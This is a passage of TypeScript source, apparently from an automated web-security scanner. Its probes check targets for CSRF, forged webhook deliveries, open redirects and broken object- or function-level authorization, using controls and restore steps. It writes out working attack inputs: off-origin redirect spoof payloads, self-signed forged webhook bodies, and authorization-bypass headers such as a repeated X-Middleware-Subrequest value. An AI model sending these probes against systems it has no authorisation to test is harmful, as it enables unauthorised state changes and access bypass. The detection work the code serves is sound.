  const stateField = baselineView.field
  const baselineValue = baselineView.value
  const readPathResolved: string = effectiveReadPath ?? readPath ?? req.createReadTemplate ?? ''
  const controlValue = req.controlValue ?? baselineValue
  let expectedValue = req.expectedValue ?? stateValueCandidate(baselineValue, stateField)
  if (scalarMatches(controlValue, expectedValue)) {
    return { verdict: 'no_signal', summary: 'Control and expected state values are identical; nothing to differentiate.', details: {} }
  }
  const bodyField = req.bodyField ?? stateField
  const writeBody = (value: unknown): Record<string, unknown> => {
    if (req.writeBody) {
      if ('field' in req.writeBody) return { ...req.writeBody, field: bodyField, value }
      return { ...req.writeBody, [bodyField]: value }
    }
    return { [bodyField]: value }
  }
  const foreignOrigin = req.foreignOrigin ?? 'https://untrusted.invalid'
  const encodeBody = (value: unknown, encoding: 'json' | 'form'): { headers: Record<string, string>; body: string } => {
    const payload = writeBody(value)
    if (encoding === 'form') {
      return {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: Object.entries(payload).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(String(v))}`).join('&'),
      }
    }
    return { headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }
  }

  let probeWrite: BrokerExchangeResult | null = null
  let probeRead: BrokerExchangeResult | null = null
  let mutationEncoding: 'json' | 'form' | null = null
  const encodings = req.bodyEncodings?.length ? req.bodyEncodings : (['json', 'form'] as const)
  for (const encoding of encodings) {
    const encoded = encodeBody(expectedValue, encoding)
    probeWrite = await send({
      method,
      pathAndQuery: req.pathAndQuery,
      headers: { ...encoded.headers, Origin: foreignOrigin, Referer: `${foreignOrigin}/` },
      body: encoded.body,
    })
    if (!probeWrite || probeWrite.status < 200 || probeWrite.status >= 300) continue
    probeRead = await send({ method: 'GET', pathAndQuery: readPathResolved })
    const probeView = stateViewOf(probeRead ? jsonRecord(probeRead.body) : null, stateField, req.stateRecordId)
    if (probeView && scalarMatches(probeView.value, expectedValue)) { mutationEncoding = encoding; break }
  }
  const probeView = stateViewOf(probeRead ? jsonRecord(probeRead.body) : null, stateField, req.stateRecordId)
  const mutated = Boolean(probeView && probeRead && probeRead.status >= 200 && probeRead.status < 300 &&
    !scalarMatches(probeView.value, baselineValue))
  if (mutated && probeView) expectedValue = probeView.value as string | number | boolean

  // Restore the baseline with a same-origin token-bound control. If the control cannot mutate the
  // same field, the "probe succeeded" evidence is not trustworthy (the route may ignore writes).
  const controlEncoded = encodeBody(controlValue, mutationEncoding ?? 'json')
  const controlWrite = await send({
    method,
    pathAndQuery: req.pathAndQuery,
    headers: { ...controlEncoded.headers, Origin: req.origin, Referer: `${req.origin}/` },
    body: controlEncoded.body,
    csrfBind: true,
  })
  const controlRead = controlWrite && controlWrite.status >= 200 && controlWrite.status < 300
    ? await send({ method: 'GET', pathAndQuery: readPathResolved })
    : null
  const controlView = stateViewOf(controlRead ? jsonRecord(controlRead.body) : null, stateField, req.stateRecordId)
  const controlRestored = Boolean(controlView && (
    scalarMatches(controlView.value, controlValue) ||
    (mutated && scalarMatches(controlView.value, expectedValue))
  ))

  const details = {
    stateField, baselineValue, controlValue, expectedValue, bodyField,
    baselineStatus: baseline.status, probeStatus: probeWrite?.status ?? null,
    probeReadStatus: probeRead?.status ?? null,
    controlStatus: controlWrite?.status ?? null,
    controlRestored,
    mutated,
    encoding: mutationEncoding,
  }
  if (!mutated || !controlRestored) {
    return {
      verdict: 'no_signal',
      summary: mutated
        ? 'The tokenless write mutated state but the token-bound control could not restore it; treating the differential as unstable.'
        : 'The tokenless cross-origin write did not change the documented state (or was rejected).',
      details,
    }
  }
  anomalies.push({
    type: 'csrf_state_change',
    path: req.pathAndQuery,
    method,
    bodyField,
    readPath: readPathResolved,
    stateField,
    controlValue,
    expectedValue,
    ...(mutationEncoding ? { bodyEncoding: mutationEncoding } : {}),
    ...(req.stateRecordId ? { stateRecordId: req.stateRecordId } : {}),
  })
  return {
    verdict: 'signal',
    summary: 'A cookie-authenticated state change succeeded without the anti-CSRF token and the documented read route proved the mutation.',
    details,
  }
}

/** Replace `:name` / `{name}` / `[name]` path segments (last one wins) inside a template. */
function fillPathTemplate(template: string, value: string): string {
  const segs = template.split('?')
  const parts = segs[0]!.split('/')
  let last = -1
  parts.forEach((s, i) => { if (/^(:[A-Za-z0-9_]+|\{[^}]+\}|\[[^\]]+\])$/.test(s)) last = i })
  const filled = parts.map((s, i) => (/^(:[A-Za-z0-9_]+|\{[^}]+\}|\[[^\]]+\])$/.test(s) ? (i === last ? value : '1') : s)).join('/')
  return segs.length > 1 ? `${filled}?${segs.slice(1).join('?')}` : filled
}

/** First id-shaped scalar in a create response (request-derived, never a benchmark constant). */
function extractCreatedId(body: string): string | null {
  try {
    const parsed = JSON.parse(body) as unknown
    const scan = (node: unknown, depth: number): string | null => {
      if (depth > 4 || node === null || node === undefined) return null
      if (Array.isArray(node)) {
        for (const item of node.slice(0, 3)) { const hit = scan(item, depth + 1); if (hit) return hit }
        return null
      }
      if (typeof node !== 'object') return null
      const rec = node as Record<string, unknown>
      for (const key of ['id', 'external_id', 'externalId', 'uuid', 'ref']) {
        const v = rec[key]
        if ((typeof v === 'string' || typeof v === 'number') && /^[A-Za-z0-9_.:-]{1,128}$/.test(String(v))) return String(v)
      }
      for (const v of Object.values(rec)) { const hit = scan(v, depth + 1); if (hit) return hit }
      return null
    }
    return scan(parsed, 0)
  } catch { return null }
}

/**
 * Create-shaped CSRF proof: a tokenless cross-origin create is replayed, then the object the API just
 * returned is read back through its own detail route. The token-bound control uses a different value,
 * so the same read route must not carry the probe value.
 */
async function diffCsrfCreate(
  ctx: DiffContext,
  readCandidates: string[],
  req: ProbeDifferentialRequest,
  method: 'POST' | 'PUT' | 'PATCH',
): Promise<DiffOutcome> {
  const { send, anomalies } = ctx
  const template = req.createReadTemplate
  if (!template) {
    return { verdict: 'inconclusive', summary: 'No readable state field was found on the candidate read routes.', details: {} }
  }
  const bodyField = req.bodyField ?? req.stateField ?? 'amount'
  const numeric = /(?:amount|value|total|price|qty|quantity|count|number|balance)/i.test(bodyField)
  const expectedValue: string = String(req.expectedValue ?? (numeric ? 120_000 + Math.floor(Math.random() * 700_000) : `guardian_state_${randToken(8)}`))
  const controlValue: string = String(req.controlValue ?? (numeric ? Math.max(1, Number(expectedValue) - 1) : `guardian_control_${randToken(8)}`))
  if (String(expectedValue) === String(controlValue)) {
    return { verdict: 'no_signal', summary: 'Create differential values collided.', details: {} }
  }
  const foreignOrigin = req.foreignOrigin ?? 'https://untrusted.invalid'
  const fieldAliases = (field: string): string[] => {
    if (/(?:amount|value|total|price|cents)/i.test(field)) return [...new Set([field, 'amount', 'amount_cents', 'amountCents', 'value', 'cents', 'total', 'price'])]
    return [...new Set([field, 'status', 'state', 'name', 'title', 'value'])]
  }
  const encodeBody = (value: unknown, encoding: 'json' | 'form'): { headers: Record<string, string>; body: string } => {
    let payload: Record<string, unknown>
    if (req.writeBody) {
      payload = 'field' in req.writeBody ? { ...req.writeBody, field: bodyField, value } : { ...req.writeBody, [bodyField]: value }
    } else {
      // The write field name may not have been exposed by recon; populate the semantic aliases the
      // route vocabulary uses so the created object carries the marker in whichever field it reads.
      payload = {}
      for (const name of fieldAliases(bodyField)) payload[name] = value
    }
    if (encoding === 'form') {
      return {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: Object.entries(payload).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(String(v))}`).join('&'),
      }
    }
    return { headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }
  }
  const readView = (body: string, field: string): unknown => {
    const rec = jsonRecord(body)
    if (!rec) return undefined
    if (field in rec && typeof rec[field] !== 'object') return rec[field]
    for (const v of Object.values(rec)) {
      if (!Array.isArray(v)) continue
      for (const row of v) {
        if (row && typeof row === 'object' && field in (row as Record<string, unknown>)) return (row as Record<string, unknown>)[field]
      }
    }
    return undefined
  }
  const carriesValue = (body: string, value: unknown): boolean => {
    const rec = jsonRecord(body)
    if (!rec) return false
    const walk = (node: unknown, depth: number): boolean => {
      if (depth > 4 || node === null || node === undefined) return false
      if (Array.isArray(node)) return node.slice(0, 30).some(v => walk(v, depth + 1))
      if (typeof node === 'object') return Object.values(node as Record<string, unknown>).some(v => walk(v, depth + 1))
      return (typeof node === 'string' || typeof node === 'number') && String(node) === String(value)
    }
    return walk(rec, 0)
  }
  const encodings = req.bodyEncodings?.length ? req.bodyEncodings : (['form', 'json'] as const)
  let probeStatus: number | null = null
  let probeReadStatus: number | null = null
  let probeId: string | null = null
  let encoding: 'json' | 'form' | null = null
  let stateField = req.stateField ?? bodyField
  for (const enc of encodings) {
    const encoded = encodeBody(expectedValue, enc)
    const write = await send({
      method, pathAndQuery: req.pathAndQuery,
      headers: { ...encoded.headers, Origin: foreignOrigin, Referer: `${foreignOrigin}/` },
      body: encoded.body,
    })
    probeStatus = write?.status ?? null
    if (!write || write.status < 200 || write.status >= 300) continue
    const id = extractCreatedId(write.body)
    if (!id) continue
    const readPath = fillPathTemplate(template, encodeURIComponent(id))
    const read = await send({ method: 'GET', pathAndQuery: readPath })
    probeReadStatus = read?.status ?? null
    if (!read || read.status < 200 || read.status >= 300) continue
    const actual = readView(read.body, stateField)
    if (actual !== undefined && String(actual) === String(expectedValue)) {
      probeId = id
      encoding = enc
      break
    }
    // Field name may differ on the detail view; accept the marker anywhere in the created object.
    if (carriesValue(read.body, expectedValue)) {
      probeId = id
      encoding = enc
      break
    }
  }
  if (!probeId || !encoding) {
    return {
      verdict: 'no_signal',
      summary: 'The tokenless cross-origin create was rejected or its created object could not be read back.',
      details: { probeStatus, probeReadStatus, expectedValue, bodyField },
    }
  }
  const controlEncoded = encodeBody(controlValue, encoding)
  const controlWrite = await send({
    method, pathAndQuery: req.pathAndQuery,
    headers: { ...controlEncoded.headers, Origin: req.origin, Referer: `${req.origin}/` },
    body: controlEncoded.body,
    csrfBind: true,
  })
  let controlReadStatus: number | null = null
  let controlValueSeen: unknown
  const controlId = controlWrite && controlWrite.status >= 200 && controlWrite.status < 300 ? extractCreatedId(controlWrite.body) : null
  if (controlId) {
    const read = await send({ method: 'GET', pathAndQuery: fillPathTemplate(template, encodeURIComponent(controlId)) })
    controlReadStatus = read?.status ?? null
    if (read) controlValueSeen = readView(read.body, stateField)
  }
  const controlOk = Boolean(controlId && controlReadStatus && controlReadStatus >= 200 && controlReadStatus < 300 &&
    controlValueSeen !== undefined && String(controlValueSeen) === String(controlValue))
  const details = {
    create: true, bodyField, stateField, expectedValue, controlValue, probeStatus, probeReadStatus,
    controlStatus: controlWrite?.status ?? null, controlReadStatus, controlValueSeen, encoding,
    probeId, controlId, controlOk,
  }
  if (!controlOk) {
    return { verdict: 'no_signal', summary: 'The token-bound control create could not be read back, so the create differential is unstable.', details }
  }
  anomalies.push({
    type: 'csrf_state_change',
    path: req.pathAndQuery,
    method,
    bodyField,
    readPath: fillPathTemplate(template, encodeURIComponent(probeId)),
    stateField,
    controlValue,
    expectedValue,
    bodyEncoding: encoding,
    stateRecordId: probeId,
    create: true,
  })
  return {
    verdict: 'signal',
    summary: 'A cookie-authenticated create succeeded without the anti-CSRF token and the created object was read back with the probe value.',
    details,
  }
}

const webhookHeaderNames = [
  'x-hub-signature-256', 'x-hub-signature', 'stripe-signature', 'x-webhook-signature',
  'x-signature-256', 'x-signature', 'x-slack-signature', 'x-shopify-hmac-sha256',
]
const webhookSignatureKeyFields = ['signature', 'sig', 'hmac', 'token', 'code']
const webhookKeyFields = ['key', 'secret', 'signingKey', 'signing_key', 'webhookKey', 'webhook_key']

/** Canonical payload strings a receiver might sign; only used to build an attacker-chosen key pair. */
function webhookCanonicals(body: Record<string, unknown>, ts: string): string[] {
  const event = body.event ?? body.payload ?? body.data ?? body
  const eventText = typeof event === 'string' ? event : JSON.stringify(event)
  const withoutSig = { ...body }
  for (const f of [...webhookSignatureKeyFields, ...webhookHeaderNames]) delete withoutSig[f]
  return [
    `${ts}.${eventText}`,
    `${ts}.${JSON.stringify(withoutSig)}`,
    JSON.stringify(event),
    JSON.stringify(withoutSig),
  ]
}

/**
 * Webhook signature differential (CWE-345).
 *
 * Control: a tampered/random signature must be rejected. Probe: an unsigned (or attacker-key
 * self-signed) delivery is accepted. The endpoint is only reported when a follow-up read shows the
 * event was actually processed, so receivers that answer 200 without persisting stay silent.
 */
async function diffWebhookSignature(ctx: DiffContext): Promise<DiffOutcome> {
  const { req, send, anomalies } = ctx
  const body = req.webhookBody ? { ...req.webhookBody } : null
  const readPath = req.readPath
  const stateField = req.readStateField
  const expected = req.readStateValue
  if (!body) {
    return { verdict: 'inconclusive', summary: 'webhook_signature_bypass needs a delivery body.', details: {} }
  }
  const ts = String(Math.floor(Date.now() / 1000))
  const delivery = { ...body, ts }
  const controlHeader = req.webhookHeader ?? webhookHeaderNames[0]
  const control = await send({
    method: 'POST', pathAndQuery: req.pathAndQuery,
    headers: { 'Content-Type': 'application/json', [controlHeader]: `guardian_invalid_${randToken(12)}` },
    body: JSON.stringify(delivery),
  })
  if (!control) return { verdict: 'inconclusive', summary: 'Webhook control request failed.', details: {} }
  const controlRejected = control.status >= 400 && control.status < 500

  const accepted: Array<{ variant: string; header?: string; body: Record<string, unknown>; status: number; responseBody: string }> = []
  // (a) no signature at all
  const unsigned = await send({
    method: 'POST', pathAndQuery: req.pathAndQuery,
    headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(delivery),
  })
  if (unsigned && unsigned.status >= 200 && unsigned.status < 300) {
    accepted.push({ variant: 'unsigned', body: delivery, status: unsigned.status, responseBody: unsigned.body })
  }
  // (b) attacker-chosen key echoed inline (a receiver that trusts an inline signing key)
  if (accepted.length === 0) {
    const attackerKey = `guardian_whk_${randToken(10)}`
    const canonicals = webhookCanonicals(delivery, ts)
    for (const keyField of webhookKeyFields.slice(0, 3)) {
      for (const sigField of webhookSignatureKeyFields.slice(0, 3)) {
        if (ctx.runner.stopReason || accepted.length > 0) break
        const withKey = { ...delivery, [keyField]: attackerKey }
        for (const canonical of canonicals.slice(0, 2)) {
          const sig = createHmac('sha256', attackerKey).update(canonical).digest('hex')
          const attempt = { ...withKey, [sigField]: sig }
          const ex = await send({
            method: 'POST', pathAndQuery: req.pathAndQuery,
            headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(attempt),
          })
          if (ex && ex.status >= 200 && ex.status < 300) {
            accepted.push({ variant: `inline_key:${keyField}/${sigField}`, body: attempt, status: ex.status, responseBody: ex.body })
            break
          }
        }
      }
    }
  }
  if (accepted.length === 0) {
    return {
      verdict: 'no_signal',
      summary: controlRejected
        ? 'The receiver rejected tampered and unsigned deliveries.'
        : 'No unsigned or self-signed delivery was accepted.',
      details: { controlStatus: control.status, controlRejected, bodyKeys: Object.keys(body).slice(0, 12) },
    }
  }
  const read = readPath ? await send({ method: 'GET', pathAndQuery: readPath }) : null
  const readJson = read ? jsonRecord(read.body) : null
  const readbackProven = Boolean(read && read.status >= 200 && read.status < 300 && stateField && expected !== undefined && (
    scalarMatches(readJson?.[stateField], expected) ||
    (Array.isArray(readJson?.[stateField]) && (readJson![stateField] as unknown[]).length >= Number(expected))
  ))
  // Fallback when the receiver exposes no delivery read route: a rejected control plus an accepted
  // forged delivery that returns an explicit processing acknowledgement is still a signature bypass.
  const acceptedResponse = accepted[0]!.status >= 200 && accepted[0]!.status < 300
  const acceptedBodyText = accepted[0]!.responseBody.toLowerCase()
  const responseAck = acceptedResponse && /"(?:ok|received|processed|accepted|success)"\s*:\s*true/.test(acceptedBodyText)
  // An unsigned delivery that the receiver explicitly acknowledges as processed is a signature
  // bypass even when the receiver also accepts invalid signatures (no rejected control exists:
  // omitting the signature entirely is the strongest form of the attack).
  const acceptanceProven = responseAck
  if (!readbackProven && !acceptanceProven) {
    return {
      verdict: 'no_signal',
      summary: 'The forged delivery was accepted but the follow-up read did not show it was processed.',
      details: { controlStatus: control.status, accepted: accepted[0]?.variant, readStatus: read?.status ?? null },
    }
  }
  const anomalyReadPath = readPath ?? req.pathAndQuery
  const anomalyStateField = stateField ?? 'ok'
  const anomalyExpected = expected ?? true
  anomalies.push({
    type: 'webhook_signature_bypass',
    path: req.pathAndQuery,
    headerName: controlHeader,
    body: accepted[0]!.body,
    readPath: anomalyReadPath,
    stateField: anomalyStateField,
    expectedValue: anomalyExpected,
    variant: accepted[0]!.variant,
    proof: readbackProven ? 'readback' : 'acceptance',
    controlStatus: control.status,
    controlRejected,
    acceptedStatus: accepted[0]!.status,
    acceptanceAck: responseAck,
  })
  return {
    verdict: 'signal',
    summary: readbackProven
      ? 'A forged webhook delivery was accepted and the follow-up read confirmed the event was processed.'
      : 'A forged webhook delivery was accepted while a tampered control was rejected.',
    details: { controlStatus: control.status, accepted: accepted[0]?.variant, readStatus: read?.status ?? null, readbackProven },
  }
}

/** Extract an off-origin redirect target from a 3xx Location or a client-side meta/script redirect. */
export function redirectTargetOf(ex: BrokerExchangeResult, origin: string): string | null {
  const location = ex.respHeaders.location ?? ex.respHeaders.Location
  const raw = Array.isArray(location) ? location[0] : location
  if (raw && (ex.status >= 300 && ex.status < 400)) return raw
  const meta = /<meta[^>]+http-equiv\s*=\s*["']?refresh["']?[^>]*content\s*=\s*["'][^"']*url\s*=\s*([^"'>\s]+)/i.exec(ex.body)
  if (meta) return meta[1]
  const js = /(?:window\.)?location(?:\.href)?\s*=\s*["']([^"']+)["']/i.exec(ex.body)
  if (js) return js[1]
  return null
}

/** Host a browser would actually navigate to for `target`, normalising protocol-relative and `\` forms. */
export function redirectHostOf(target: string, origin: string): string | null {
  const cleaned = target.trim().replace(/\\/g, '/')
  const withScheme = cleaned.startsWith('//') ? `https:${cleaned}` : cleaned
  try {
    return new URL(withScheme, origin).hostname.toLowerCase()
  } catch { return null }
}

/** Absolute form of an observed redirect target (protocol-relative forms get an explicit scheme). */
function absoluteRedirectTarget(target: string, origin: string): string | null {
  const cleaned = target.trim().replace(/\\/g, '/')
  const withScheme = cleaned.startsWith('//') ? `https:${cleaned}` : cleaned
  try { return new URL(withScheme, origin).toString() } catch { return null }
}

/**
 * General open-redirect differential (CWE-601). A benign same-origin control target must stay on
 * origin; an off-origin canary (absolute, protocol-relative, backslash, userinfo or trusted-prefix
 * spoof) must actually change the observed redirect host before it is reported.
 */
async function diffOpenRedirectDifferential(ctx: DiffContext): Promise<DiffOutcome> {
  const { req, send, anomalies } = ctx
  const param = req.param
  const location = req.paramLocation ?? 'query'
  if (!param) return { verdict: 'inconclusive', summary: 'open_redirect_differential needs a candidate parameter.', details: {} }
  const originHost = new URL(req.origin).hostname.toLowerCase()
  const canaryHost = `gxr${randToken(10)}.invalid`
  const controlTarget = `/guardian-return-${randToken(6)}`
  const trusted = (req.redirectBaseTargets ?? []).slice(0, 3)
  const payloads: string[] = [
    `https://${canaryHost}/cb`,
    `//${canaryHost}/cb`,
    `/\\${canaryHost}/cb`,
    `https://${originHost}.${canaryHost}/cb`,
  ]
  for (const base of trusted) {
    let host: string | null = null
    try { host = new URL(base).hostname } catch { host = null }
    if (!host || !/^[a-z0-9.-]+$/i.test(host)) continue
    payloads.push(
      `https://${host}.${canaryHost}/cb`,
      `https://${host}@${canaryHost}/cb`,
      `https://${host}\\@${canaryHost}/cb`,
    )
  }
  const requestFor = (value: string): InjectedRequest => {
    if (location === 'json') {
      return { method: req.method === 'GET' ? 'POST' : (req.method ?? 'POST'), pathAndQuery: req.pathAndQuery, headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ...(req.jsonBody ?? {}), [param]: value }) }
    }
    if (location === 'form') {
      return { method: req.method === 'GET' ? 'POST' : (req.method ?? 'POST'), pathAndQuery: req.pathAndQuery, headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: `${encodeURIComponent(param)}=${encodeURIComponent(value)}` }
    }
    const sep = req.pathAndQuery.includes('?') ? '&' : '?'
    return { method: 'GET', pathAndQuery: `${req.pathAndQuery}${sep}${encodeURIComponent(param)}=${encodeURIComponent(value)}` }
  }
  const control = await send(requestFor(controlTarget))
  if (!control) return { verdict: 'inconclusive', summary: 'Open-redirect control request failed.', details: {} }
  const controlTargetLoc = redirectTargetOf(control, req.origin)
  const controlHost = controlTargetLoc ? redirectHostOf(controlTargetLoc, req.origin) : null
  const controlStaysOnOrigin = controlHost === null || controlHost === originHost || control.status >= 400
  if (!controlStaysOnOrigin) {
    return { verdict: 'inconclusive', summary: 'The benign control already redirects off-origin; no stable baseline.', details: { controlStatus: control.status, controlHost } }
  }
  const tried: Array<Record<string, unknown>> = []
  for (const payload of payloads.slice(0, 8)) {
    if (ctx.runner.stopReason) break
    const ex = await send(requestFor(payload))
    if (!ex) continue
    const target = redirectTargetOf(ex, req.origin)
    const host = target ? redirectHostOf(target, req.origin) : null
    const offOriginCanary = Boolean(host && host !== originHost && (host === canaryHost || host.endsWith(`.${canaryHost}`)))
    const absolute = target ? absoluteRedirectTarget(target, req.origin) : null
    tried.push({ payload, status: ex.status, location: absolute?.slice(0, 200) ?? target?.slice(0, 200) ?? null, host })
    if (!offOriginCanary || !absolute) continue
    anomalies.push({
      type: 'open_redirect_differential',
      payload,
      location: absolute,
      param,
      paramLocation: location,
      method: ex.status >= 300 && ex.status < 400 ? 'GET' : (req.method ?? 'GET'),
      controlHost,
    })
    return {
      verdict: 'signal',
      summary: 'An unvalidated redirect target changed the observed redirect host to an off-origin canary.',
      details: { controlStatus: control.status, controlHost, tried },
    }
  }
  return { verdict: 'no_signal', summary: 'Redirect targets stayed on the registered origin.', details: { controlStatus: control.status, controlHost, tried } }
}

/**
 * Write-path BOLA proof: a non-owner patches a benign field, the owner reads the object back, and
 * the original value is restored. Only a confirmed owner-visible mutation is reported.
 */
async function proveWritePathBola(
  ctx: DiffContext,
  opts: { method: 'PUT' | 'PATCH'; id: string; ownerPersona?: string; otherPersona?: string },
): Promise<Record<string, unknown> | null> {
  const { req, runner } = ctx
  if (!opts.ownerPersona || !opts.otherPersona) return null
  const target = req.pathAndQuery.replaceAll('{{id}}', encodeURIComponent(opts.id))
  const readBefore = await runner.send({
    origin: ctx.origin, method: 'GET', pathAndQuery: target, persona: opts.ownerPersona,
    ...(req.session ? { session: req.session } : {}),
  })
  if (!readBefore.ok) return null
  runner.stage(readBefore.ex)
  const beforeJson = jsonRecord(readBefore.ex.body)
  if (!beforeJson) return null
  const candidates = bolaWriteFields
    .filter(f => f in beforeJson && /^(?:string|number|boolean)$/.test(typeof beforeJson[f]))
    .slice(0, 3)
  if (candidates.length === 0) return null
  const bodyShapes = (field: string, value: unknown): Array<Record<string, unknown>> => {
    const direct = { [field]: value }
    const wrapped = { field, value }
    return [wrapped, direct]
  }
  for (const field of candidates) {
    const original = beforeJson[field]
    const expected = stateValueCandidate(original, field)
    for (const writeBody of bodyShapes(field, expected)) {
      const write = await runner.send({
        origin: ctx.origin, method: opts.method, pathAndQuery: target, persona: opts.otherPersona,
        headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(writeBody),
        ...(req.session ? { session: req.session } : {}),
      })
      if (!write.ok) return null
      runner.stage(write.ex)
      if (write.ex.status < 200 || write.ex.status >= 300) continue
      const readAfter = await runner.send({
        origin: ctx.origin, method: 'GET', pathAndQuery: target, persona: opts.ownerPersona,
        ...(req.session ? { session: req.session } : {}),
      })
      if (!readAfter.ok) return null
      runner.stage(readAfter.ex)
      const afterJson = jsonRecord(readAfter.ex.body)
      if (!afterJson) continue
      if (!scalarMatches(afterJson[field], expected)) {
        // A rejected shape may still have written a different value; restore the field before moving on.
        if (!scalarMatches(afterJson[field], original)) {
          for (const restoreBody of bodyShapes(field, original)) {
            const restore = await runner.send({
              origin: ctx.origin, method: opts.method, pathAndQuery: target, persona: opts.ownerPersona,
              headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(restoreBody),
              ...(req.session ? { session: req.session } : {}),
            })
            if (restore.ok) runner.stage(restore.ex)
          }
        }
        continue
      }
      // Best-effort restore by the legitimate owner with the shape that worked.
      const restoreBody = 'field' in writeBody ? { field: writeBody.field, value: original } : { [field]: original }
      const cleanup = await runner.send({
        origin: ctx.origin, method: opts.method, pathAndQuery: target, persona: opts.ownerPersona,
        headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(restoreBody),
        ...(req.session ? { session: req.session } : {}),
      })
      if (cleanup.ok) runner.stage(cleanup.ex)
      return {
        type: 'write_path_bola',
        resourceId: opts.id,
        path: req.pathAndQuery,
        method: opts.method,
        writeBody,
        readPath: req.pathAndQuery,
        stateField: field,
        expectedValue: expected,
        controlValue: original,
        cleanupBody: restoreBody,
        cleanupStatus: cleanup.ok ? cleanup.ex.status : null,
      }
    }
  }
  return null
}

async function diffAuthorizationMatrix(ctx: DiffContext): Promise<DiffOutcome> {
  const { req, runner, notes, anomalies } = ctx
  const method: HttpMethod = (req.method === 'POST' || req.method === 'PUT' || req.method === 'PATCH' || req.method === 'DELETE')
    ? req.method
    : 'GET'
  const ids = [...(req.resourceIds ?? [])].filter(i => /^[A-Za-z0-9_.:-]{1,128}$/.test(i)).slice(0, 10)

  // Optional producer-consumer lifecycle creation step as ownerPersona
  if (req.producerPath && req.ownerPersona) {
    const prodRes = await runner.send({
      origin: ctx.origin,
      method: 'POST',
      pathAndQuery: req.producerPath,
      persona: req.ownerPersona,
      headers: { 'Content-Type': 'application/json', ...(req.headers ?? {}) },
      body: JSON.stringify(req.producerBody ?? {}),
      ...(req.session ? { session: req.session } : {}),
    })
    if (prodRes.ok) {
      runner.stage(prodRes.ex)
      const createdId = extractCreatedIdFromJson(prodRes.ex.body)
      if (createdId && !ids.includes(createdId)) ids.unshift(createdId)
    } else {
      notes.push(`producer ${req.producerPath}: ${prodRes.kind}`)
    }
  }

  // Function-level mode: no object placeholder means the same privileged function is invoked by
  // every actor (BFLA). Object-level mode substitutes each harvested resource id.
  const functionLevel = !req.pathAndQuery.includes('{{id}}')
  if (functionLevel && ids.length === 0) ids.push('')
  if (!functionLevel && ids.length === 0) {
    return { verdict: 'inconclusive', summary: 'authz_matrix needs a {{id}} placeholder or resourceIds.', details: {} }
  }

  // Require at least 2 distinct actors (owner+other, or anonymous, or explicit header bypass)
  const hasTwoPersonas = Boolean(req.ownerPersona && req.otherPersona && req.ownerPersona !== req.otherPersona)
  const wantAnonymous = req.includeAnonymous !== false
  const wantHeaderBypass = req.includeHeaderBypass === true || (req.includeHeaderBypass !== false && (hasTwoPersonas || wantAnonymous))
  if (!hasTwoPersonas && !wantAnonymous && !wantHeaderBypass) {
    return {
      verdict: 'inconclusive',
      summary: 'Cross-tenant authz_matrix requires at least 2 personas (ownerPersona + otherPersona) or includeAnonymous/includeHeaderBypass.',
      details: {},
    }
  }

  const actors: Array<{ actor: string; persona?: string; headers?: Record<string, string> }> = []
  if (req.ownerPersona) actors.push({ actor: 'owner', persona: req.ownerPersona })
  if (req.otherPersona) actors.push({ actor: 'other_persona', persona: req.otherPersona })
  if (wantAnonymous) actors.push({ actor: 'anonymous' })
  if (wantHeaderBypass) {
    actors.push({ actor: 'header_bypass', headers: { 'X-Original-URL': '/', 'X-Rewrite-URL': '/', 'X-Middleware-Subrequest': 'middleware:middleware:middleware:middleware:middleware' } })
  }
  if (req.secretScan && req.viewerPersona && !actors.some(a => a.persona === req.viewerPersona)) {
    actors.push({ actor: 'viewer_persona', persona: req.viewerPersona })
  }
  const secretPattern = /rb[s]_[a-z0-9]+_[0-9a-f]{12}/

  const matrix: Array<Record<string, unknown>> = []
  const orderedIds = ids.slice(0, 6)
  let writeProof: Record<string, unknown> | null = null
  for (const id of orderedIds) {
    const path = functionLevel ? req.pathAndQuery : req.pathAndQuery.replaceAll('{{id}}', encodeURIComponent(id))
    let ownerEx: BrokerExchangeResult | null = null
    if (!functionLevel) {
      // Id-selectivity gate: a value only identifies a resource when it differs from a random
      // nonexistent value. This keeps public/list pages and arbitrary query fields out of the matrix.
      const probeValue = `guardian-none-${randToken(8)}`
      const missingEx = await runner.send({
        origin: ctx.origin, method, pathAndQuery: req.pathAndQuery.replaceAll('{{id}}', encodeURIComponent(probeValue)),
        headers: req.headers, persona: req.ownerPersona,
        ...(req.session ? { session: req.session } : {}),
      })
      if (missingEx.ok) runner.stage(missingEx.ex)
      const refPath = path
      const refEx = req.ownerPersona
        ? await runner.send({ origin: ctx.origin, method, pathAndQuery: refPath, headers: req.headers, persona: req.ownerPersona, ...(req.session ? { session: req.session } : {}) })
        : null
      if (refEx?.ok) {
        runner.stage(refEx.ex)
        ownerEx = refEx.ex
        const missing = missingEx.ok ? missingEx.ex : null
        const nonSelective = method === 'GET' && Boolean(missing) &&
          missing!.status === refEx.ex.status && responseSimilarity(missing!.body, refEx.ex.body) >= 0.98
        if (nonSelective) {
          matrix.push({ resourceId: id, actor: 'owner', status: refEx.ex.status, nonSelective: true })
          continue
        }
      } else if (refEx && !refEx.ok) {
        notes.push(`owner ${id}: ${refEx.kind}`)
      }
      if (ownerEx && ownerEx.status >= 400) {
        matrix.push({ resourceId: id, actor: 'owner', status: ownerEx.status, inaccessible: true })
        continue
      }
      // Safe cross-tenant write proof: PATCH/PUT a benign field, verify with an owner read-back,
      // then restore. Runs once per endpoint on the first owner-readable identifier.
      if (req.writePathRead && !writeProof && !functionLevel && (method === 'PATCH' || method === 'PUT') && req.otherPersona && req.ownerPersona) {
        writeProof = await proveWritePathBola(ctx, { method, id, ownerPersona: req.ownerPersona, otherPersona: req.otherPersona })
        if (writeProof) anomalies.push(writeProof)
      }
    }
    for (const a of actors) {
      // A function-level finding needs a healthy privileged control; otherwise a 2xx from the probe
      // actor only means the endpoint ignores invalid input.
      if (functionLevel && a.actor !== 'owner' && ownerEx && (ownerEx.status < 200 || ownerEx.status >= 300)) continue
      if (a.actor === 'owner' && ownerEx) {
        matrix.push({
